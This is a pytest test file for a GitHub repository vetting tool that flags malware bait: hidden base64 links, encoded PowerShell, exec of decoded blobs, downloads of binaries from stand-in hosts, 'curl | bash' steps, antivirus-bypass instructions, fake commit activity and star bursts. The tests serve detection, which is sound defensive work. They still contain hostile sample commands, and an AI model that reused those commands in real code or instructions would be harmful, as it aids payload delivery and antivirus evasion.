import base64

from labkit import repovet
from labkit.repovet import CAUTION, INFO, RED, Signal

NOW = 1_800_000_000.0
DAY = 86400


def codes(signals, level=None):
    return {s.code for s in signals if level is None or s.level == level}


def b64(text):
    return base64.b64encode(text.encode()).decode()


# --- references ---------------------------------------------------------------------------

def test_parse_repo_reads_every_url_shape():
    assert repovet.parse_repo("https://github.com/owner/name") == ("owner/name", "")
    assert repovet.parse_repo("git+https://github.com/owner/name.git@abc1234") == ("owner/name", "abc1234")
    assert repovet.parse_repo("https://github.com/owner/name/archive/refs/tags/v0.7.0.tar.gz") == ("owner/name", "v0.7.0")
    assert repovet.parse_repo("https://github.com/owner/name/tree/main") == ("owner/name", "main")
    assert repovet.parse_repo("git@github.com:owner/name.git") == ("owner/name", "")
    assert repovet.parse_repo("owner/name") == ("owner/name", "")
    assert repovet.parse_repo("https://example.com/owner/name") is None


def test_repo_refs_finds_the_repositories_a_file_points_at():
    text = ('uv pip install "git+https://github.com/k2-fsa/OmniVoice" soundfile\n'
            'clone_at https://github.com/comfyanonymous/ComfyUI "$RT/ComfyUI" "$COMFY_REF"\n'
            "labkit @ https://github.com/me/labkit/archive/refs/tags/v0.7.0.tar.gz\n"
            "see https://github.com/orgs/community/discussions/1\n")
    assert repovet.repo_refs(text) == [("comfyanonymous/ComfyUI", ""), ("k2-fsa/OmniVoice", ""),
                                       ("me/labkit", "v0.7.0")]


def test_is_pinned_tells_a_commit_or_tag_from_a_branch():
    assert repovet.is_pinned("373048b") and repovet.is_pinned("v1.2.3") and repovet.is_pinned("0.9.0")
    assert not repovet.is_pinned("main") and not repovet.is_pinned("") and not repovet.is_pinned("develop")


# --- one file -----------------------------------------------------------------------------

def test_a_base64_string_hiding_a_download_link_is_red():
    text = f'url = b64decode("{b64("https://files-cdn.example.net/setup/installer.zip")}")'
    found = repovet.scan_text("nodes.py", text)
    assert codes(found, RED) == {"hidden_link"} and "files-cdn.example.net" in found[0].text


def test_base64_that_is_not_a_hidden_link_is_ignored():
    plain = b64("https://github.com/owner/name/blob/main/README.md")       # a link to GitHub hides nothing
    sha = "sha256-" + base64.b64encode(bytes(range(32))).decode()           # an integrity hash decodes to noise
    assert repovet.scan_text("a.py", f"x = '{plain}'\nintegrity = '{sha}'") == []


def test_a_hidden_shell_command_and_encoded_powershell_are_red():
    hidden = b64("powershell -w hidden Invoke-WebRequest stage2")
    assert "hidden_command" in codes(repovet.scan_text("install.py", f"run('{hidden}')"), RED)
    assert "encoded_powershell" in codes(repovet.scan_text("install.bat", "powershell -NoP -enc SQBFAFgA\n"), RED)
    assert "exec_decoded" in codes(repovet.scan_text("__init__.py", "exec(base64.b64decode(blob))"), RED)
    assert "fetches_binary" in codes(
        repovet.scan_text("__init__.py", 'urlretrieve("https://x.example/tool.exe", "tool.exe")'), RED)


def test_a_readme_telling_the_user_to_get_past_the_antivirus_is_red():
    for line in ("Disable Windows Defender before you run the installer.",
                 "If SmartScreen appears, click More info and then Run anyway.",
                 "Your antivirus may flag the file, this is a false positive, just add an exclusion.",
                 "Turn off real-time protection first."):
        assert "av_bypass" in codes(repovet.scan_text("README.md", line), RED), line
    # the same words in code are a weaker sign than an instruction to the user
    assert codes(repovet.scan_text("util.py", "# disable defender tests on CI")) == {"av_bypass"}
    assert codes(repovet.scan_text("util.py", "# disable defender tests on CI"), RED) == set()


def test_an_ordinary_readme_is_clean():
    text = ("# ComfyUI-GGUF\nGGUF quantization support for native ComfyUI models.\n\n"
            "## Installation\n```\ngit clone https://github.com/owner/ComfyUI-GGUF\n"
            "pip install --upgrade gguf\n```\nOn Windows use the embedded python.\n"
            "curl -LsSf https://astral.sh/uv/install.sh | sh\n")
    assert repovet.scan_text("README.md", text) == []


def test_download_hosts_and_piping_into_a_shell_are_cautions_and_a_password_makes_it_red():
    assert codes(repovet.scan_text("README.md", "Download: https://mega.nz/file/abc"), CAUTION) == {"download_host"}
    red = repovet.scan_text("README.md", "Download https://mediafire.com/x/tool.zip\nArchive password: 2025")
    assert codes(red, RED) == {"download_host"}
    assert "pipe_to_shell" in codes(repovet.scan_text("README.md", "curl -s https://get.example.io/i.sh | bash"), CAUTION)


# --- activity, substance, identity ----------------------------------------------------------

def _commits(n, message, files, author="bot", step=3600):
    return [{"date": NOW - i * step * 7, "author": author, "message": message(i), "files": files(i) if i < 12 else None}
            for i in range(n)]


def test_commits_that_only_bump_one_file_are_fake_activity():
    streak = _commits(60, lambda i: "Update counter", lambda i: ["update_me.yaml"])
    found = repovet.commit_signals(streak)
    assert codes(found, CAUTION) == {"fake_activity"} and "update_me.yaml" in found[0].text


def test_real_development_is_not_fake_activity():
    real = [{"date": NOW - i * 50000, "author": ["City", "blepping", "rattus"][i % 3],
             "message": f"fix: thing {i}", "files": [f"module{i % 5}.py", "README.md"] if i < 12 else None}
            for i in range(60)]
    assert repovet.commit_signals(real) == []
    assert repovet.commit_signals(_commits(5, lambda i: "Update", lambda i: ["a"])) == []     # too few to judge


def test_a_long_readme_over_almost_no_code_is_thin():
    assert codes(repovet.substance_signals(readme_bytes=9000, code_bytes=2000, code_files=1)) == {"thin_code"}
    assert repovet.substance_signals(readme_bytes=9000, code_bytes=400_000, code_files=40) == []
    found = repovet.substance_signals(readme_bytes=500, code_bytes=3000, code_files=3, release_assets=["Setup.exe", "notes.txt"])
    assert codes(found) == {"binary_release"}


def test_identity_young_lookalike_fork_and_star_burst():
    meta = {"full_name": "newbie/ComfyUI-GGUF", "created_at": "2027-01-10T00:00:00Z", "stargazers_count": 300}
    owner = {"created_at": "2027-01-09T00:00:00Z"}
    twins = [{"full_name": "city96/ComfyUI-GGUF", "stargazers_count": 4245}]
    now = repovet._ts("2027-01-15T00:00:00Z")
    found = repovet.identity_signals(meta, owner, twins, [], now)
    assert codes(found, CAUTION) == {"new_repo", "new_owner", "lookalike"}
    fork = dict(meta, created_at="2026-08-30T00:00:00Z", parent={"full_name": "city96/ComfyUI-GGUF"})
    found = repovet.identity_signals(fork, {"created_at": "2018-01-01T00:00:00Z"}, twins, [], now)
    assert codes(found) == {"fork"} and found[0].level == INFO
    burst = [now - 200 * DAY + i * 60 for i in range(100)]
    old = dict(meta, created_at="2026-01-01T00:00:00Z")
    assert "star_burst" in codes(repovet.identity_signals(old, {}, [], burst, now))
    spread = [now - 200 * DAY + i * DAY for i in range(100)]
    assert "star_burst" not in codes(repovet.identity_signals(old, {}, [], spread, now))


def test_verdict_is_red_on_one_red_or_three_different_cautions():
    c = lambda code: Signal(code, CAUTION, "x")  # noqa: E731
    assert repovet.verdict([]) == "ok" and repovet.verdict([Signal("fork", INFO, "x")]) == "ok"
    assert repovet.verdict([c("a"), c("a"), c("a")]) == "caution"          # the same sign three times is one sign
    assert repovet.verdict([c("a"), c("b"), c("c")]) == "red"
    assert repovet.verdict([Signal("av_bypass", RED, "x")]) == "red"


# --- a folder on disk, and a whole repository through a fake API -----------------------------

def test_scan_tree_reads_text_files_and_skips_vendored_folders(tmp_path):
    (tmp_path / "README.md").write_text("Disable your antivirus first.\n")
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "x.js").write_text("eval(atob('aaaa'))")
    (tmp_path / "weights.safetensors").write_bytes(b"\x00" * 10)
    found = repovet.scan_tree(tmp_path)
    assert [(s.code, s.where) for s in found] == [("av_bypass", "README.md")]


def _fake_github(readme, tree, commits, meta=None, languages=None, releases=()):
    meta = {"full_name": "owner/tool", "default_branch": "main", "owner": {"login": "owner"},
            "created_at": "2024-01-01T00:00:00Z", "stargazers_count": 10, **(meta or {})}

    def get(path, accept=None, raw=False):
        if raw:
            return readme if path.endswith("README.md") else "print('hi')\n"
        if path == "/repos/owner/tool":
            return meta
        if path.startswith("/users/"):
            return {"created_at": "2020-01-01T00:00:00Z"}
        if path.endswith("/languages"):
            return languages or {"Python": 300_000}
        if "/git/trees/" in path:
            return {"tree": [{"path": p, "type": "blob", "size": len(readme) if p == "README.md" else 500} for p in tree]}
        if "/releases" in path:
            return list(releases)
        if "/commits?" in path:
            return [{"sha": f"s{i}", "commit": {"message": c["message"], "author": {"name": c["author"]},
                                                "committer": {"date": "2026-01-01T00:00:00Z"}}}
                    for i, c in enumerate(commits)]
        if "/commits/" in path:
            return {"files": [{"filename": f} for f in commits[int(path.rsplit("/s", 1)[1])]["files"] or []]}
        if path.startswith("/search/"):
            return {"items": []}
        raise AssertionError(path)

    return get


def test_vet_passes_a_real_looking_project_and_flags_a_fake_one():
    real = [{"message": f"fix {i}", "author": "a" if i % 2 else "b", "files": [f"m{i}.py"]} for i in range(30)]
    good = repovet.vet("https://github.com/owner/tool", get=_fake_github("# Tool\nDoes a thing.\n", ["README.md", "tool/a.py", "tool/b.py", "tool/c.py"], real), now=NOW)
    assert good.verdict == "ok" and good.error == "" and good.facts["code_kb"] == 300

    bait = ("# AI Video Upscaler PRO\n" + "- amazing feature\n" * 300 +
            "Download from https://mediafire.com/file/x/Setup.zip (archive password: 1234).\n"
            "Windows SmartScreen will warn you: click More info, then Run anyway.\n")
    churn = [{"message": "Update README.md", "author": "dev", "files": ["README.md"]} for _ in range(40)]
    bad = repovet.vet("owner/tool", get=_fake_github(bait, ["README.md", "main.py"], churn, languages={"Python": 900},
                                                    releases=[{"body": "", "assets": [{"name": "Setup.exe"}]}]), now=NOW)
    assert bad.verdict == "red"
    assert {"av_bypass", "download_host", "fake_activity", "thin_code", "binary_release"} <= codes(bad.signals)
    assert bad.summary().splitlines()[1].startswith("- red: ") and "Run anyway" in bad.summary()   # red signs first
    assert bad.to_dict()["verdict"] == "red"


def test_vet_reports_what_it_could_not_read_instead_of_raising():
    def get(path, accept=None, raw=False):
        raise RuntimeError("404")
    report = repovet.vet("owner/gone", get=get)
    assert report.error.startswith("RuntimeError") and report.verdict == "ok" and report.signals == []
    assert repovet.vet("not a url").error == "not a GitHub repository URL"


def test_vet_does_not_call_a_refused_star_list_an_error():
    real = [{"message": f"fix {i}", "author": "a", "files": [f"m{i}.py"]} for i in range(30)]
    inner = _fake_github("# Tool\n", ["README.md", "a.py", "b.py", "c.py"], real, meta={"stargazers_count": 900})

    def get(path, accept=None, raw=False):
        if "/stargazers" in path:
            raise RuntimeError("403")
        return inner(path, accept, raw)
    report = repovet.vet("owner/tool", get=get, now=NOW)
    assert report.error == "" and report.verdict == "ok"
